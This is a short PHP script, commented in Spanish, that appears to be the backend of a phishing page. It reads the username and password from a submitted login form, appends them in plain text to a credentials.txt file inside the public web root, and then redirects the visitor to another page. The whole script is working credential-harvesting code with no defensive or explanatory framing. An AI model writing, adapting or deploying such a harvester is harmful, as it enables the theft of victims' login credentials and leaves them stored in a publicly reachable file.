<?php
// Capturar los datos del formulario
$username = isset($_POST['username']) ? $_POST['username'] : 'No username';
$password = isset($_POST['password']) ? $_POST['password'] : 'No password';

// Ruta al archivo de credenciales
$file = fopen("/var/www/html/credentials.txt", "a");

// Verificar si el archivo se abrió correctamente
if ($file) {
    // Escribir las credenciales en el archivo
    fwrite($file, "Username: " . $username . " - Password: " . $password . "\n");

    // Cerrar el archivo
    fclose($file);

    // Redirigir a la página redireccion.html
    header('Location: redireccion.html');
    exit();
} else {
    // Mostrar un mensaje de error si no se puede abrir el archivo
    echo "No se pudo abrir el archivo para escribir las credenciales.";
}
?>

